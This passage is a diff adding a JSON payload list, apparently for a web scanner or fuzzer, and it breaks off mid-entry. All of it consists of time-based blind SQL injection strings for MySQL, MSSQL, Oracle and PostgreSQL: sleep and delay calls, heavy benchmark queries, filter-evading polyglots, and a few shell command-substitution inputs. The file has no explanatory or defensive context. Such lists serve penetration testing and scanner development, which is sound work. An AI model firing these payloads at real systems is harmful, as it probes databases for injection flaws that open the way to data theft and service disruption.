@@ -1,0 +1,1358 @@
+[
+  {
+    "name": "mysql",
+    "payload": "sleep(5)#"
+  },
+  {
+    "name": "mssql",
+    "payload": ";waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "oracle",
+    "payload": "1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\";SELECT pg_sleep(5);"
+  },
+  {
+    "name": "mysql",
+    "payload": "(sleep 5)--"
+  },
+  {
+    "name": "mssql",
+    "payload": "';WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "oracle",
+    "payload": "1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": ";SELECT pg_sleep(5);"
+  },
+  {
+    "name": "mysql",
+    "payload": "(sleep 5)"
+  },
+  {
+    "name": "mssql",
+    "payload": ");waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "oracle",
+    "payload": "' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "and SELECT pg_sleep(5);"
+  },
+  {
+    "name": "mysql",
+    "payload": "(sleep(5))--"
+  },
+  {
+    "name": "mssql",
+    "payload": "';waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "oracle",
+    "payload": "') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 SELECT pg_sleep(5);"
+  },
+  {
+    "name": "mysql",
+    "payload": "(sleep(5))"
+  },
+  {
+    "name": "mssql",
+    "payload": "\";waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "oracle",
+    "payload": ") AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or SELECT pg_sleep(5);"
+  },
+  {
+    "name": "mysql",
+    "payload": "-sleep(5)"
+  },
+  {
+    "name": "mssql",
+    "payload": "');waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "(SELECT pg_sleep(5))"
+  },
+  {
+    "name": "mysql",
+    "payload": "SLEEP(5)#"
+  },
+  {
+    "name": "mssql",
+    "payload": "\");waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "SLEEP(5)--"
+  },
+  {
+    "name": "mssql",
+    "payload": "));waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "SLEEP(5)=\""
+  },
+  {
+    "name": "mssql",
+    "payload": "'));waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\" or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "SLEEP(5)='"
+  },
+  {
+    "name": "mssql",
+    "payload": "\"));waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "' or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "\";sleep 5--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\") IF (1=1) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1) or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "\";sleep 5"
+  },
+  {
+    "name": "mssql",
+    "payload": "';%5waitfor%5delay%5'0:0:5'%5--%5"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\") or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "\";sleep(5)--"
+  },
+  {
+    "name": "mssql",
+    "payload": "' WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "') or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "\";sleep(5)"
+  },
+  {
+    "name": "mssql",
+    "payload": "' WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1)) or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "\";SELECT SLEEP(5); #"
+  },
+  {
+    "name": "mssql",
+    "payload": "or WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "\")) or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 SELECT SLEEP(5); #"
+  },
+  {
+    "name": "mssql",
+    "payload": "or WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "postgresql",
+    "payload": "')) or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "+ SLEEP(5) + '"
+  },
+  {
+    "name": "mssql",
+    "payload": "and WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_SLEEP(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "\u0026\u0026SLEEP(5)"
+  },
+  {
+    "name": "mssql",
+    "payload": "and WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_SLEEP(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "\u0026\u0026SLEEP(5)--"
+  },
+  {
+    "name": "mssql",
+    "payload": "WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "postgresql",
+    "payload": "pg_SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "\u0026\u0026SLEEP(5)#"
+  },
+  {
+    "name": "mssql",
+    "payload": ";WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_SLEEP(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": ";sleep 5--"
+  },
+  {
+    "name": "mssql",
+    "payload": ";WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_SLEEP(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": ";sleep 5"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": ";sleep(5)--"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "postgresql",
+    "payload": "' SELECT pg_sleep(5);"
+  },
+  {
+    "name": "mysql",
+    "payload": ";sleep(5)"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 WAITFOR DELAY '0:0:5'-- 1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))"
+  },
+  {
+    "name": "mysql",
+    "payload": ";SELECT SLEEP(5); #"
+  },
+  {
+    "name": "mssql",
+    "payload": "1' WAITFOR DELAY '0:0:5' AND '1337'='1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'\u0026\u0026SLEEP(5)\u0026\u0026'1"
+  },
+  {
+    "name": "mssql",
+    "payload": "1') WAITFOR DELAY '0:0:5' AND ('1337'='1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' SELECT SLEEP(5); #"
+  },
+  {
+    "name": "mssql",
+    "payload": "1) WAITFOR DELAY '0:0:5' AND (1337=1337"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "benchmark(50000000,MD5(1))"
+  },
+  {
+    "name": "mssql",
+    "payload": "') WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "benchmark(50000000,MD5(1))--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\" WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "benchmark(50000000,MD5(1))#"
+  },
+  {
+    "name": "mssql",
+    "payload": "')) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": ") or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "or benchmark(50000000,MD5(1))"
+  },
+  {
+    "name": "mssql",
+    "payload": "'))) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "postgresql",
+    "payload": ")) or pg_sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "or benchmark(50000000,MD5(1))--"
+  },
+  {
+    "name": "mssql",
+    "payload": "%' WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mysql",
+    "payload": "or benchmark(50000000,MD5(1))#"
+  },
+  {
+    "name": "mssql",
+    "payload": "\") WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mysql",
+    "payload": "ORDER BY SLEEP(5)"
+  },
+  {
+    "name": "mssql",
+    "payload": "\")) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mysql",
+    "payload": "ORDER BY SLEEP(5)--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\"))) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mysql",
+    "payload": "ORDER BY SLEEP(5)#"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mysql",
+    "payload": "AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mssql",
+    "payload": "1' waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mysql",
+    "payload": "OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "RANDOMBLOB(500000000/2)"
+  },
+  {
+    "name": "mysql",
+    "payload": "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+  },
+  {
+    "name": "mysql",
+    "payload": "OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
+  },
+  {
+    "name": "mysql",
+    "payload": "RANDOMBLOB(1000000000/2)"
+  },
+  {
+    "name": "mysql",
+    "payload": "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
+  },
+  {
+    "name": "mysql",
+    "payload": "OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))"
+  },
+  {
+    "name": "mysql",
+    "payload": "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z"
+  },
+  {
+    "name": "mysql",
+    "payload": "0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z"
+  },
+  {
+    "name": "mysql",
+    "payload": "if(now()=sysdate(),sleep(5),0)"
+  },
+  {
+    "name": "mysql",
+    "payload": "'XOR(if(now()=sysdate(),sleep(5),0))XOR'"
+  },
+  {
+    "name": "mysql",
+    "payload": "'XOR(if(now()=sysdate(),sleep(5*1),0))OR'"
+  },
+  {
+    "name": "mysql",
+    "payload": "0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z"
+  },
+  {
+    "name": "mysql",
+    "payload": "0'or(now()=sysdate()\u0026\u0026SLEEP(1))or'Zif(now()=sysdate(),sleep(5),0)/\"XOR(if(now()=sysdate(),sleep(5),0))OR\"/if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0))OR\"*/if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5),0))OR'\"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)\"/if(1=1,sleep(5),0)/*'XOR(if(1=1,sleep(5),0))OR'\"XOR(if(1=1,sleep(5),0))OR\"*/if(1337=1337,exp(~(1)),0)/*'XOR(if(1337=1337,exp(~(1)),0))OR'\"XOR(if(1337=1337,sleep(5),0))OR\"*/SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/%2c(select%5*%5from%5(select(sleep(5)))a)"
+  },
+  {
+    "name": "mysql",
+    "payload": "(select(0)from(select(sleep(5)))v)"
+  },
+  {
+    "name": "mysql",
+    "payload": "(SELECT SLEEP(5))"
+  },
+  {
+    "name": "mysql",
+    "payload": "'%2b(select*from(select(sleep(5)))a)%2b'"
+  },
+  {
+    "name": "mysql",
+    "payload": "(select*from(select(sleep(5)))a)"
+  },
+  {
+    "name": "mysql",
+    "payload": "1'%2b(select*from(select(sleep(5)))a)%2b'"
+  },
+  {
+    "name": "mysql",
+    "payload": ",(select * from (select(sleep(5)))a)"
+  },
+  {
+    "name": "mysql",
+    "payload": "desc%2c(select*from(select(sleep(5)))a)"
+  },
+  {
+    "name": "mysql",
+    "payload": "-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))"
+  },
+  {
+    "name": "mysql",
+    "payload": "-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))(SELECT * FROM (SELECT(SLEEP(5)))YYYY)(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--'+(select*from(select(sleep(5)))a)+'(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'\"(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*%2f(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*/(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'\\\"+(select(0)from(select(sleep(5)))v)+\\\"*/',''),/*test*/%26%26%09sLeEp(5)%09--+"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 and sleep 5--"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 and sleep 5"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 and sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 and sleep(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "' and sleep 5--"
+  },
+  {
+    "name": "mysql",
+    "payload": "' and sleep 5"
+  },
+  {
+    "name": "mysql",
+    "payload": "' and sleep 5 and '1'='1"
+  },
+  {
+    "name": "mysql",
+    "payload": "' and sleep(5) and '1'='1"
+  },
+  {
+    "name": "mysql",
+    "payload": "' and sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "' and sleep(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AnD SLEEP(5) ANd '1"
+  },
+  {
+    "name": "mysql",
+    "payload": "and sleep 5--"
+  },
+  {
+    "name": "mysql",
+    "payload": "and sleep 5"
+  },
+  {
+    "name": "mysql",
+    "payload": "and sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "and sleep(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "and SELECT SLEEP(5); #"
+  },
+  {
+    "name": "mysql",
+    "payload": "AnD SLEEP(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "AnD SLEEP(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "AnD SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "or sleep 5--"
+  },
+  {
+    "name": "mysql",
+    "payload": "or sleep 5"
+  },
+  {
+    "name": "mysql",
+    "payload": "or sleep(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "or sleep(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "or SELECT SLEEP(5); #"
+  },
+  {
+    "name": "mysql",
+    "payload": "or SLEEP(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "or SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "or SLEEP(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "or SLEEP(5)=\""
+  },
+  {
+    "name": "mysql",
+    "payload": "or SLEEP(5)='"
+  },
+  {
+    "name": "mysql",
+    "payload": "' OR SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" OR SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "') OR SLEEP(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) or sleep(5)='"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" or sleep(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "1) or sleep(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) or sleep(5)='"
+  },
+  {
+    "name": "mysql",
+    "payload": "1)) or sleep(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "or sleep(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "%20'sleep%2050'"
+  },
+  {
+    "name": "mysql",
+    "payload": "%20$(sleep%2050)"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) or sleep(5)=\""
+  },
+  {
+    "name": "mysql",
+    "payload": "or sleep(5)='"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") or sleep(5)=\""
+  },
+  {
+    "name": "mysql",
+    "payload": ") or sleep(5)='"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 or sleep(5)#"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('PBiy'='PBiy"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)# 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "+(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))+"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "` WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "`) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "`=`1` AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND `1`=`1"
+  },
+  {
+    "name": "mysql",
+    "payload": "]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY))|[1"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND (SELECT 3122 FROM (SELECT(SLEEP(5)))YYYY) AND '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND (SELECT 4796 FROM (SELECT(SLEEP(5)))YYYY) AND ('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "%' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337%'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND '1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND \"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND ((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND \"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "RLIKE SLEEP(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "' RLIKE SLEEP(5)--"
+  },
+  {
+    "name": "mysql",
+    "payload": "' RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') RLIKE SLEEP(5) AND ('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) RLIKE SLEEP(5) AND (('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) RLIKE SLEEP(5) AND ((('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") RLIKE SLEEP(5) AND (1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) RLIKE SLEEP(5) AND ((1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "))) RLIKE SLEEP(5) AND (((1337=1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 RLIKE SLEEP(5)"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 RLIKE SLEEP(5)# 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "1 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "+(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(5))+"
+  },
+  {
+    "name": "mysql",
+    "payload": ")) AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": ") AS 1337 WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "` WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "`) WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' RLIKE SLEEP(5) AND '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') RLIKE SLEEP(5) AND ('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) RLIKE SLEEP(5) AND (('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) RLIKE SLEEP(5) AND ((('1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "%' RLIKE SLEEP(5) AND '1337%'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' RLIKE SLEEP(5) AND '1337' LIKE '1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") RLIKE SLEEP(5) AND (\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) RLIKE SLEEP(5) AND ((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) RLIKE SLEEP(5) AND (((\"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" RLIKE SLEEP(5) AND \"1337\"=\"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") RLIKE SLEEP(5) AND (\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\")) RLIKE SLEEP(5) AND ((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\"))) RLIKE SLEEP(5) AND (((\"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" RLIKE SLEEP(5) AND \"1337\" LIKE \"1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' RLIKE SLEEP(5) OR '1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" WHERE 1337=1337 RLIKE SLEEP(5)-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND ELT(1337=1337,SLEEP(5))--"
+  },
+  {
+    "name": "mysql",
+    "payload": "' AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "\" AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND ELT(1337=1337,SLEEP(5))-- 1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "') AND ELT(1337=1337,SLEEP(5)) AND ('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "')) AND ELT(1337=1337,SLEEP(5)) AND (('1337'='1337"
+  },
+  {
+    "name": "mysql",
+    "payload": "'))) AND ELT(1337=1337,SLEEP(5)) AND ((('1337'='1337"
+  },
+  {
+    "name": "mysql",
